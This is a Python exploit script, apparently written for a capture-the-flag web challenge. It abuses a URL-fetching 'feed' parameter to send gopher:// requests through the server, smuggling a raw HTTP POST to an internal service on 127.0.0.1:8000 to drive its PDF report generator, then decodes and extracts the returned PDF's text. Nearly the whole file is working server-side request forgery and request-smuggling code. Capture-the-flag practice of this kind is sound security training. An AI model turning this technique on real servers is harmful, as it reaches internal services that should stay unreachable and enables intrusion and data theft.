import requests, re, sys, urllib.parse, json, base64, html, subprocess, os, time
U="https://odyssey.web.2026.sunshinectf.games/"
def gopher(raw, host="127.0.0.1", port=8000, timeout=60):
    enc=urllib.parse.quote(raw, safe='')
    url=f"gopher://{host}:{port}/_{enc}"
    for _ in range(5):
        try:
            r=requests.get(U, params={"feed":url}, timeout=timeout)
            h=r.text
            pre=re.search(r'<pre class="tape">(.*?)</pre>', h, re.S)
            return html.unescape(pre.group(1)) if pre else None
        except Exception as e:
            time.sleep(5)
    return None
def build_post(path, body):
    lines=[f"POST {path} HTTP/1.1","Host: 127.0.0.1:8000",
           "Content-Type: application/x-www-form-urlencoded",
           f"Content-Length: {len(body.encode())}","Connection: close"]
    return "\r\n".join(lines)+"\r\n\r\n"+body
def gen_pdf(content, title="Report", out="/challenge/workspace/out.pdf"):
    body=urllib.parse.urlencode({"content":content,"title":title})
    resp=gopher(build_post("/report", body))
    if not resp: return None, "noresp"
    i=resp.find("\r\n\r\n")
    payload=resp[i+4:] if i>=0 else resp
    try:
        j=json.loads(payload)
    except Exception as e:
        return None, "jsonfail:"+payload[:200]
    if "data" not in j: return None, json.dumps(j)[:200]
    d=base64.b64decode(j["data"])
    open(out,"wb").write(d)
    return d, None
def pdftext(path="/challenge/workspace/out.pdf"):
    subprocess.run(["pdftotext",path,"/challenge/workspace/out.txt"])
    try: return open("/challenge/workspace/out.txt","rb").read().decode("utf-8","replace")
    except: return ""
if __name__=="__main__":
    content=sys.stdin.read()
    d,err=gen_pdf(content)
    if err: print("ERR",err)
    else:
        print("PDF bytes",len(d))
        info=subprocess.run(["pdfinfo","/challenge/workspace/out.pdf"],capture_output=True,text=True).stdout
        print(info)
        print("TEXT>>>", pdftext()[:2000])
